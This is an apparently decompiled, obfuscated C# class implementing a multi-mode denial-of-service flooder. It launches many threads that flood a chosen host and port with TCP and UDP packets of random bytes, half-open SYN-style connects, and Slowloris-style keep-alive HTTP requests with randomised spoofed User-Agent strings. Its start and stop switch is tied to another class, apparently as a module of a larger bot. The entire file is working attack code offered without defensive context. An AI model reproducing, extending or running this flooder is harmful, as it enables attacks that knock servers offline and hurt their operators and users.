using System;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace ns0;

internal class Class10
{
	public enum Enum2
	{
		const_0,
		const_1,
		const_2,
		const_3
	}

	private static Enum2 enum2_0;

	private static bool bool_0;

	private static string string_0;

	private static int int_0;

	private static int int_1;

	private static int int_2;

	private static int int_3;

	private static Class6 class6_0;

	private static string[] string_1 = new string[28]
	{
		"(compatible; MSIE 6.0; Windows NT)", "(Macintosh; U; Intel Mac OS X 10.4; en-US; rv:1.9b5) Gecko/2008032619 Firefox/3.0b5", "(Windows; U; Windows NT 5.1; en-US; rv:1.8.0.5) Gecko/20060731 Firefox/1.5.0.5 Flock/0.7.4.1 ", "(MobilePhone SCP-5500/US/1.0) NetFront/3.0 MMP/2.0 (compatible; Googlebot/2.1; http://www.google.com/bot.html)", "[en] (WinNT; U)", "(compatible; MSIE 7.0; Windows NT 5.1; bgft) ", "(compatible; MSIE 6.0; Win32)", "(X11; U; Linux 2.4.2-2 i586; en-US; m18) Gecko/20010131 Netscape6/6.01", "(X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801", "(SunOS 5.8 sun4u; U) Opera 5.0 [en]",
		"(compatible; Googlebot/2.1; http://www.google.com/bot.html)  ", "(X11; U; Linux i686; en-US; rv:1.8) Gecko/20051111 Firefox/1.5 BAVM/1.0.0", "(X11; U; Linux i686; en-US; rv:1.9.1a2pre) Gecko/2008073000 Shredder/3.0a2pre ThunderBrowse/3.2.1.8 ", "(Windows; U; Windows NT 6.1; it; rv:1.9.2) Gecko/20100115 Firefox/3.6", "Galeon/1.2.0 (X11; Linux i686; U;) Gecko/20020326", "(Windows NT 5.1; U; en) Presto/2.5.22 Version/10.50", "(Windows NT 5.2; U; en) Presto/2.2.15 Version/10.10", "(X11; Linux x86_64; U; Linux Mint; en) Presto/2.2.15 Version/10.10", "(Macintosh; PPC Mac OS X; U; en) Opera 8.0", "(Windows; U; Windows NT 5.1; en-US; rv:0.9.6) Gecko/20011128",
		"(Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10", "(iPhone; U; CPU like Mac OS X; en) AppleWebKit/420.1 (KHTML, like Gecko) Version/3.0 Mobile/4A93 Safari/419.3", "(compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET CLR 4.0.20402; MS-RTC LM 8)", "(Windows; U; MSIE 7.0; Windows NT 6.0; en-US)", "(compatible; MSIE 6.1; Windows XP; .NET CLR 1.1.4322; .NET CLR 2.0.50727)", "(compatible; MSIE 8.0; Windows NT 6.2; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)", "(compatible; MSIE 6.1; Windows XP)", "(Windows; U; Windows NT 6.1; nl; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3"
	};

	private static string[] string_2 = new string[10] { "Mozilla/3.0 ", "Mozilla/3.1 ", "Mozilla/3.6 ", "Mozilla/4.0 ", "Mozilla/4.08 ", "Mozilla/5.0 ", "Opera/9.33 ", "Opera/9.0 ", "Opera/8.90 ", "Opera/9.80 " };

	public static Enum2 Enum2_0 => enum2_0;

	public static string String_0 => enum2_0 switch
	{
		Enum2.const_0 => "TCP", 
		Enum2.const_1 => "SYN", 
		Enum2.const_2 => "UDP", 
		Enum2.const_3 => "Slowloris", 
		_ => null, 
	};

	public static bool Boolean_0 => bool_0;

	public static void smethod_0(Enum2 enum2_1, string string_3, int int_4, int int_5, int int_6, int int_7, Class6 class6_1)
	{
		enum2_0 = enum2_1;
		string_0 = string_3;
		int_0 = int_4;
		int_1 = int_5;
		int_3 = int_6;
		int_2 = int_7;
		class6_0 = class6_1;
		bool_0 = false;
	}

	public static void smethod_1()
	{
		bool_0 = true;
		new Thread(smethod_3).Start();
	}

	public static void smethod_2()
	{
		bool_0 = false;
	}

	private static void smethod_3()
	{
		for (int i = 0; i < int_1; i++)
		{
			try
			{
				Thread thread = new Thread(smethod_4);
				thread.IsBackground = true;
				thread.Start();
			}
			catch (OutOfMemoryException)
			{
				int_1 = i - 1;
				break;
			}
		}
	}

	private static void smethod_4()
	{
		int num = 0;
		while (bool_0 && class6_0.Boolean_0)
		{
			switch (enum2_0)
			{
			case Enum2.const_0:
			{
				Socket socket4 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
				socket4.Blocking = false;
				while (num < int_3 && bool_0 && class6_0.Boolean_0)
				{
					try
					{
						socket4.Connect(string_0, int_0);
						socket4.Send(smethod_7());
						socket4.Close();
						socket4 = null;
					}
					catch
					{
						socket4.Close();
						socket4 = null;
						break;
					}
					num++;
					Thread.Sleep(1);
				}
				Thread.Sleep(int_2);
				break;
			}
			case Enum2.const_1:
			{
				Socket socket2 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
				socket2.Blocking = false;
				try
				{
					socket2.BeginConnect(string_0, int_0, smethod_5, null);
				}
				catch
				{
				}
				Thread.Sleep(100);
				try
				{
					if (socket2.Connected)
					{
						socket2.Disconnect(reuseSocket: false);
					}
					socket2.Close();
					socket2 = null;
				}
				catch
				{
				}
				Thread.Sleep(int_2);
				break;
			}
			case Enum2.const_2:
			{
				Socket socket3 = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
				socket3.Blocking = false;
				try
				{
					socket3.Connect(string_0, int_0);
					while (num < int_3 && bool_0 && class6_0.Boolean_0)
					{
						socket3.Send(smethod_6());
						num++;
						Thread.Sleep(1);
					}
					socket3.Close();
					socket3 = null;
				}
				catch
				{
					socket3.Close();
					socket3 = null;
					break;
				}
				Thread.Sleep(int_2);
				break;
			}
			case Enum2.const_3:
			{
				Socket socket = null;
				try
				{
					socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
					socket.Connect(string_0, int_0);
					socket.Send(smethod_8());
					while (socket.Connected && bool_0 && class6_0.Boolean_0)
					{
						socket.Send(smethod_8());
						Thread.Sleep(2000);
					}
				}
				catch
				{
					socket.Close();
					socket = null;
				}
				Thread.Sleep(int_2);
				break;
			}
			}
			num = 0;
		}
		if (bool_0)
		{
			smethod_2();
		}
	}

	private static void smethod_5(IAsyncResult iasyncResult_0)
	{
	}

	private static byte[] smethod_6()
	{
		Random random = new Random();
		byte[] array = new byte[random.Next(1470, 65507)];
		random.NextBytes(array);
		random = null;
		return array;
	}

	private static byte[] smethod_7()
	{
		Random random = new Random();
		byte[] array = new byte[random.Next(1470, 65535)];
		random.NextBytes(array);
		random = null;
		return array;
	}

	private static byte[] smethod_8()
	{
		Random random = new Random();
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("GET / HTTP/1.1");
		stringBuilder.AppendLine("Host: " + string_0);
		stringBuilder.AppendLine("User-Agent: " + string_2[random.Next(0, string_2.Length - 1)] + " " + string_1[random.Next(0, string_1.Length - 1)]);
		stringBuilder.AppendLine("Content-Length: " + random.Next(1, 1000));
		stringBuilder.AppendLine("X-a: " + random.Next(1, 10000));
		stringBuilder.Append("Connection: keep-alive");
		return Encoding.ASCII.GetBytes(stringBuilder.ToString());
	}
}
